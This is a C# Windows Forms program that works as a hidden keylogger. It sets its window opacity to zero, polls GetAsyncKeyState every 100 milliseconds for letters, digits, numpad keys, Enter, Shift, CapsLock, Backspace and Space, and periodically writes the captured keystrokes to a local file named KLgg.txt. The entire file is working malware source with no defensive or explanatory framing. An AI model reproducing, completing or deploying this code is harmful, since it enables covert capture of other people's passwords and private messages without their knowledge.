using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace KLgg
{
    public partial class Form1 : Form
    {
        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);
        private Timer Timer1 =  new Timer();
        private string Log = @"";
        private int cont = 0;

        public Form1()
        {
            InitializeComponent();
            Opacity = 0;
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            if (GetAsyncKeyState(Keys.A) != 0)
            {
                Log += "A";
            }
            if (GetAsyncKeyState(Keys.B) != 0)
            {
                Log += "B";
            }
            if (GetAsyncKeyState(Keys.C) != 0)
            {
                Log += "C";
            }
            if (GetAsyncKeyState(Keys.D) != 0)
            {
                Log += "D";
            }
            if (GetAsyncKeyState(Keys.E) != 0)
            {
                Log += "E";
            }
            if (GetAsyncKeyState(Keys.F) != 0)
            {
                Log += "F";
            }
            if (GetAsyncKeyState(Keys.G) != 0)
            {
                Log += "G";
            }
            if (GetAsyncKeyState(Keys.H) != 0)
            {
                Log += "H";
            }
            if (GetAsyncKeyState(Keys.I) != 0)
            {
                Log += "I";
            }
            if (GetAsyncKeyState(Keys.J) != 0)
            {
                Log += "J";
            }
            if (GetAsyncKeyState(Keys.K) != 0)
            {
                Log += "K";
            }
            if (GetAsyncKeyState(Keys.L) != 0)
            {
                Log += "L";
            }
            if (GetAsyncKeyState(Keys.M) != 0)
            {
                Log += "M";
            }
            if (GetAsyncKeyState(Keys.N) != 0)
            {
                Log += "N";
            }
            if (GetAsyncKeyState(Keys.O) != 0)
            {
                Log += "O";
            }
            if (GetAsyncKeyState(Keys.P) != 0)
            {
                Log += "P";
            }
            if (GetAsyncKeyState(Keys.Q) != 0)
            {
                Log += "Q";
            }
            if (GetAsyncKeyState(Keys.R) != 0)
            {
                Log += "R";
            }
            if (GetAsyncKeyState(Keys.S) != 0)
            {
                Log += "S";
            }
            if (GetAsyncKeyState(Keys.T) != 0)
            {
                Log += "T";
            }
            if (GetAsyncKeyState(Keys.U) != 0)
            {
                Log += "U";
            }
            if (GetAsyncKeyState(Keys.V) != 0)
            {
                Log += "V";
            }
            if (GetAsyncKeyState(Keys.W) != 0)
            {
                Log += "W";
            }
            if (GetAsyncKeyState(Keys.Y) != 0)
            {
                Log += "Y";
            }
            if (GetAsyncKeyState(Keys.X) != 0)
            {
                Log += "X";
            }
            if (GetAsyncKeyState(Keys.Z) != 0)
            {
                Log += "Z";
            }
            if (GetAsyncKeyState(Keys.D1) != 0)
            {
                Log += "1";
            }
            if (GetAsyncKeyState(Keys.D2) != 0)
            {
                Log += "2";
            }
            if (GetAsyncKeyState(Keys.D3) != 0)
            {
                Log += "3";
            }
            if (GetAsyncKeyState(Keys.D4) != 0)
            {
                Log += "4";
            }
            if (GetAsyncKeyState(Keys.D5) != 0)
            {
                Log += "5";
            }
            if (GetAsyncKeyState(Keys.D6) != 0)
            {
                Log += "6";
            }
            if (GetAsyncKeyState(Keys.D7) != 0)
            {
                Log += "7";
            }
            if (GetAsyncKeyState(Keys.D8) != 0)
            {
                Log += "8";
            }
            if (GetAsyncKeyState(Keys.D9) != 0)
            {
                Log += "9";
            }
            if (GetAsyncKeyState(Keys.D0) != 0)
            {
                Log += "0";
            }
            if (GetAsyncKeyState(Keys.NumPad0) != 0)
            {
                Log += "0";
            }
            if (GetAsyncKeyState(Keys.NumPad1) != 0)
            {
                Log += "1";
            }
            if (GetAsyncKeyState(Keys.NumPad2) != 0)
            {
                Log += "2";
            }
            if (GetAsyncKeyState(Keys.NumPad3) != 0)
            {
                Log += "3";
            }
            if (GetAsyncKeyState(Keys.NumPad4) != 0)
            {
                Log += "4";
            }
            if (GetAsyncKeyState(Keys.NumPad5) != 0)
            {
                Log += "5";
            }
            if (GetAsyncKeyState(Keys.NumPad6) != 0)
            {
                Log += "6";
            }
            if (GetAsyncKeyState(Keys.NumPad7) != 0)
            {
                Log += "7";
            }
            if (GetAsyncKeyState(Keys.NumPad8) != 0)
            {
                Log += "8";
            }
            if (GetAsyncKeyState(Keys.NumPad9) != 0)
            {
                Log += "9";
            }
            if (GetAsyncKeyState(Keys.Enter) != 0)
            {
                Log += "\n";
            }
            if (GetAsyncKeyState(Keys.ShiftKey) != 0)
            {
                Log += "{Shift}";
            }
            if (GetAsyncKeyState(Keys.CapsLock) != 0)
            {
                Log += "{CapsLock}";
            }
            if (GetAsyncKeyState(Keys.Back) != 0)
            {
                Log += "{Back}";
            }
            if (GetAsyncKeyState(Keys.Space) != 0)
            {
                Log += " ";
            }

            if (cont%10 == 0)
            {
                using (StreamWriter write = new StreamWriter("KLgg.txt"))
                {
                    write.Write(Log);
                }
                cont = 0;
            }

            cont++;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Timer1.Interval = 100;
            Timer1.Tick += Timer1_Tick;
            Timer1.Start();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            
        }
    }
}
